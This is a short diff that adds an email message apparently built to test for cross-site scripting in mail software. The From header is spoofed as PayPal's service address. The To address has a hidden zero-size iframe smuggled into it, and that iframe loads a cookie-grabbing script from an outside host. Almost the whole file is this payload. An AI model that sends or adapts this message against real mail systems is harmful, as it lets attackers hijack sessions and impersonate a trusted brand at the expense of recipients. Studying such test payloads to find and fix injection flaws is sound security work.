@@ -1,0 +1,7 @@
+From: "PayPal Inc"<service@paypal.com>
+To: <"victim<iframe src=\"http://www.wooyun.org/getcookie.php\" width=0 height=0 frameborder=0></iframe>@victim.com">
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
